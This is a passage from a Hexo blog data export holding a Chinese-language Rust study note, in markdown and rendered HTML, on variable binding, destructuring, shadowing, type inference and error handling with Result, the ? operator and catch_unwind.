err),\n}\n~~~\n\n同时，为了避免模板代码，rust有一个`?`的语法糖，可以在返回值为Result的函数中使用\n\n~~~rust\nuse core::time;\nuse std::{fs::OpenOptions, thread, io::Write};\n\nfn main() -> std::io::Result<()> {\n    let mut f = OpenOptions::new().write(true).open(\"hello.txt\")?; // <-\n    print!(\"{:?} \\n\", f);\n    // on the moment, manually remove the file hello.txt\n    let ten_millis = time::Duration::from_millis(10000);\n    thread::sleep(ten_millis);\n    print!(\"{:?} \\n\", f);\n    let r = f.write_all(b\"Hello, world!\")?;\n    print!(\"Result is {:?} \\n\", r);\n    drop(f);\n    Ok(())\n}\n~~~\n\n这个`?`对应的模板代码如下\n\n~~~rust\nlet f = OpenOptions::new().write(true).open(\"hello.txt\");\nlet mut f = match f{\n    Ok(file) => file,\n    Err(e) => return Err(e),\n};\n~~~\n\n如此便大幅简化了开发流程，实属厉害\n\n那么，rust有没有办法捕获异常呢\n\n有\n\n> 最后，再来说个例外，`panic::catch_unwind`。\n>\n> 先看下它的用法：\n>\n> ```rust\n> use std::panic;\n> \n> let result = panic::catch_unwind(|| {\n>     println!(\"hello!\");\n> });\n> assert!(result.is_ok());\n> \n> let result = panic::catch_unwind(|| {\n>     panic!(\"oh no!\");\n> });\n> assert!(result.is_err());\n> ```\n>\n> 没错，它的行为几乎就是try/catch了：panic！宏被捕获了，程序并也没有挂，返回了Err。尽管如此，Rust的目的并不是让它成为try/catch机制的实现，而是当Rust和其他编程语言互动时，避免其他语言代码块throw出异常。所以呢，错误处理的正道还是用**Result**。\n>\n> 从catch_unwind的名字上，需要留意下unwind这个限定词，它意味着只有默认进行栈反解的panic可以被捕获到，如果是设为直接终止程序的panic，就逮不住了。\n>\n> 细节可进一步参考[Rust Documentation](https://link.zhihu.com/?target=https%3A//doc.rust-lang.org/beta/std/panic/fn.catch_unwind.html)。","slug":"rust-note-#1","published":1,"updated":"2022-12-12T15:53:02.387Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtt002asfklccn5f8w7","content":"<h1 id=\"Rust笔记其一\"><a href=\"#Rust笔记其一\" class=\"headerlink\" title=\"Rust笔记其一\"></a>Rust笔记其一</h1><h2 id=\"变量绑定\"><a href=\"#变量绑定\" class=\"headerlink\" title=\"变量绑定\"></a>变量绑定</h2><blockquote>\n<p>在其它语言中，我们用 <code>var a = \"hello world\"</code> 的方式给 <code>a</code> 赋值，也就是把等式右边的 <code>\"hello world\"</code> 字符串赋值给变量 <code>a</code> ，而在 Rust 中，我们这样写： <code>let a = \"hello world\"</code> ，同时给这个过程起了另一个名字：<strong>变量绑定</strong>。</p>\n<p>为何不用赋值而用绑定呢（其实你也可以称之为赋值，但是绑定的含义更清晰准确）？这里就涉及 Rust 最核心的原则——<strong>所有权</strong>，简单来讲，任何内存对象都是有主人的，而且一般情况下完全属于它的主人，绑定就是把这个对象绑定给一个变量，让这个变量成为它的主人（聪明的读者应该能猜到，在这种情况下，该对象之前的主人就会丧失对该对象的所有权），像极了我们的现实世界，不是吗？</p>\n<p>摘自 《Rust Course》</p>\n</blockquote>\n<h2 id=\"解构语法\"><a href=\"#解构语法\" class=\"headerlink\" title=\"解构语法\"></a>解构语法</h2><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Struct</span> <span class=\"token punctuation\">{</span>\n    e<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    b <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 数组解构</span>\n    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">[</span>c<span class=\"token punctuation\">,</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>_<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 结构体解构</span>\n    <span class=\"token keyword\">let</span> <span class=\"token class-name\">Struct</span> <span class=\"token punctuation\">{</span> e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">..</span> <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">Struct</span> <span class=\"token punctuation\">{</span> e<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">assert_eq!</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"变量遮蔽-shadowing\"><a href=\"#变量遮蔽-shadowing\" class=\"headerlink\" title=\"变量遮蔽(shadowing)\"></a>变量遮蔽(shadowing)</h2><p>Rust 允许声明相同的变量名，在后面声明的变量会遮蔽掉前面声明的，如下所示：</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 在main函数的作用域内对之前的x进行遮蔽</span>\n    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 在当前的花括号作用域内，对之前的x进行遮蔽</span>\n        <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> x <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The value of x in the inner scope is: {}\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The value of x is: {}\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"类型推导\"><a href=\"#类型推导\" class=\"headerlink\" title=\"类型推导\"></a>类型推导</h2><p>个人感觉比较类似kt的类型推导吧，要么声明变量类型，要么指定泛型</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">except</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 报错，无法推断你想要parse的类型</span>\n<span class=\"token keyword\">let</span> guess<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">except</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// √</span>\n<span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">::</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">i32</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// √</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>rust的泛型还要打::，挺怪，但能接受。</p>\n<h2 id=\"异常处理\"><a href=\"#异常处理\" class=\"headerlink\" title=\"异常处理\"></a>异常处理</h2><blockquote>\n<h2 id=\"Rust-的错误哲学\"><a href=\"#Rust-的错误哲学\" class=\"headerlink\" title=\"Rust 的错误哲学\"></a>Rust 的错误哲学</h2><p>错误对于软件来说是不可避免的，因此一门优秀的编程语言必须有其完整的错误处理哲学。在很多情况下，Rust 需要你承认自己的代码可能会出错，并提前采取行动，来处理这些错误。</p>\n<p>Rust 中的错误主要分为两类：</p>\n<ul>\n<li><strong>可恢复错误</strong>，通常用于从系统全局角度来看可以接受的错误，例如处理用户的访问、操作等错误，这些错误只会影响某个用户自身的操作进程，而不会对系统的全局稳定性产生影响</li>\n<li><strong>不可恢复错误</strong>，刚好相反，该错误通常是全局性或者系统性的错误，例如数组越界访问，系统启动时发生了影响启动流程的错误等等，这些错误的影响往往对于系统来说是致命的</li>\n</ul>\n<p>很多编程语言，并不会区分这些错误，而是直接采用异常的方式去处理。Rust 没有异常，但是 Rust 也有自己的卧龙凤雏：<code>Result&lt;T, E&gt;</code> 用于可恢复错误，<code>panic!</code> 用于不可恢复错误。</p>\n<p>摘自 《Rust Crouse》</p>\n</blockquote>\n<p>我们可以直接使用<code>panic!</code>来抛出一个异常，让程序直接崩溃，但一般我们不会这么做。一般我们会大量的使用<code>Result</code>来进行异常的传递，毕竟Rust里是没有try catch的，而我们抛出异常的目的一般不会是直接让整个程序崩溃，而是要让其他人去处理这个异常。</p>\n<p>讲真，我觉得rust的异常处理设计得简直一级棒，比go和java的不知道高到哪里去了，kotlin的Result API也不过是是对其拙劣的模仿（暴论）~</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// expect 如产生错误 直接panic!</span>\n<span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">::</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">i32</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 比较类似go的异常处理方式，不过语法更加好看</span>\n<span class=\"token comment\">// 不过这种方式写多了会造成多层嵌套</span>\n<span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">::</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">i32</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">match</span> guess <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You guessed: {}\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Error: {}\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>同时，为了避免模板代码，rust有一个<code>?</code>的语法糖，可以在返回值为Result的函数中使用</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">use</span> <span class=\"token namespace\">core<span class=\"token punctuation\">::</span></span>time<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token punctuation\">{</span><span class=\"token namespace\">fs<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">OpenOptions</span><span class=\"token punctuation\">,</span> thread<span class=\"token punctuation\">,</span> <span class=\"token namespace\">io<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Write</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>io<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Result</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> f <span class=\"token operator\">=</span> <span class=\"token class-name\">OpenOptions</span><span class=\"token punctuation\">::</span><span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// &lt;-</span>\n    <span class=\"token macro property\">print!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{:?} \\n\"</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// on the moment, manually remove the file hello.txt</span>\n    <span class=\"token keyword\">let</span> ten_millis <span class=\"token operator\">=</span> <span class=\"token namespace\">time<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Duration</span><span class=\"token punctuation\">::</span><span class=\"token function\">from_millis</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token namespace\">thread<span class=\"token punctuation\">::</span></span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span>ten_millis<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">print!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{:?} \\n\"</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> r <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">write_all</span><span class=\"token punctuation\">(</span><span class=\"token string\">b\"Hello, world!\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">print!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Result is {:?} \\n\"</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">drop</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这个<code>?</code>对应的模板代码如下</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">let</span> f <span class=\"token operator\">=</span> <span class=\"token class-name\">OpenOptions</span><span class=\"token punctuation\">::</span><span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> f <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span> f<span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> file<span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token keyword\">return</span> <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如此便大幅简化了开发流程，实属厉害</p>\n<p>那么，rust有没有办法捕获异常呢</p>\n<p>有</p>\n<blockquote>\n<p>最后，再来说个例外，<code>panic::catch_unwind</code>。</p>\n<p>先看下它的用法：</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">use</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span>panic<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">let</span> result <span class=\"token operator\">=</span> <span class=\"token namespace\">panic<span class=\"token punctuation\">::</span></span><span class=\"token function\">catch_unwind</span><span class=\"token punctuation\">(</span><span class=\"token closure-params\"><span class=\"token closure-punctuation punctuation\">|</span><span class=\"token closure-punctuation punctuation\">|</span></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\">assert!</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span><span class=\"token function\">is_ok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">let</span> result <span class=\"token operator\">=</span> <span class=\"token namespace\">panic<span class=\"token punctuation\">::</span></span><span class=\"token function\">catch_unwind</span><span class=\"token punctuation\">(</span><span class=\"token closure-params\"><span class=\"token closure-punctuation punctuation\">|</span><span class=\"token closure-punctuation punctuation\">|</span></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">panic!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"oh no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\">assert!</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span><span class=\"token function\">is_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>没错，它的行为几乎就是try/catch了：panic！宏被捕获了，程序并也没有挂，返回了Err。尽管如此，Rust的目的并不是让它成为try/catch机制的实现，而是当Rust和其他编程语言互动时，避免其他语言代码块throw出异常。所以呢，错误处理的正道还是用<strong>Result</strong>。</p>\n<p>从catch_unwind的名字上，需要留意下unwind这个限定词，它意味着只有默认进行栈反解的panic可以被捕获到，如果是设为直接终止程序的panic，就逮不住了。</p>\n<p>细节可进一步参考<a href=\"https://link.zhihu.com/?target=https://doc.rust-lang.org/beta/std/panic/fn.catch_unwind.html\">Rust Documentation</a>。</p>\n</blockquote>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"Rust笔记其一\"><a href=\"#Rust笔记其一\" class=\"headerlink\" title=\"Rust笔记其一\"></a>Rust笔记其一</h1><h2 id=\"变量绑定\"><a href=\"#变量绑定\" class=\"headerlink\" title=\"变量绑定\"></a>变量绑定</h2><blockquote>\n<p>在其它语言中，我们用 <code>var a = &quot;hello world&quot;</code> 的方式给 <code>a</code> 赋值，也就是把等式右边的 <code>&quot;hello world&quot;</code> 字符串赋值给变量 <code>a</code> ，而在 Rust 中，我们这样写： <code>let a = &quot;hello world&quot;</code> ，同时给这个过程起了另一个名字：<strong>变量绑定</strong>。</p>\n<p>为何不用赋值而用绑定呢（其实你也可以称之为赋值，但是绑定的含义更清晰准确）？这里就涉及 Rust 最核心的原则——<strong>所有权</strong>，简单来讲，任何内存对象都是有主人的，而且一般情况下完全属于它的主人，绑定就是把这个对象绑定给一个变量，让这个变量成为它的主人（聪明的读者应该能猜到，在这种情况下，该对象之前的主人就会丧失对该对象的所有权），像极了我们的现实世界，不是吗？</p>\n<p>摘自 《Rust Course》</p>\n</blockquote>\n<h2 id=\"解构语法\"><a href=\"#解构语法\" class=\"headerlink\" title=\"解构语法\"></a>解构语法</h2><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Struct</span> <span class=\"token punctuation\">&#123;</span>\n    e<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    b <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 数组解构</span>\n    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">[</span>c<span class=\"token punctuation\">,</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>_<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 结构体解构</span>\n    <span class=\"token keyword\">let</span> <span class=\"token class-name\">Struct</span> <span class=\"token punctuation\">&#123;</span> e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">..</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">Struct</span> <span class=\"token punctuation\">&#123;</span> e<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">assert_eq!</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"变量遮蔽-shadowing\"><a href=\"#变量遮蔽-shadowing\" class=\"headerlink\" title=\"变量遮蔽(shadowing)\"></a>变量遮蔽(shadowing)</h2><p>Rust 允许声明相同的变量名，在后面声明的变量会遮蔽掉前面声明的，如下所示：</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 在main函数的作用域内对之前的x进行遮蔽</span>\n    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// 在当前的花括号作用域内，对之前的x进行遮蔽</span>\n        <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> x <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The value of x in the inner scope is: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The value of x is: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"类型推导\"><a href=\"#类型推导\" class=\"headerlink\" title=\"类型推导\"></a>类型推导</h2><p>个人感觉比较类似kt的类型推导吧，要么声明变量类型，要么指定泛型</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">except</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a 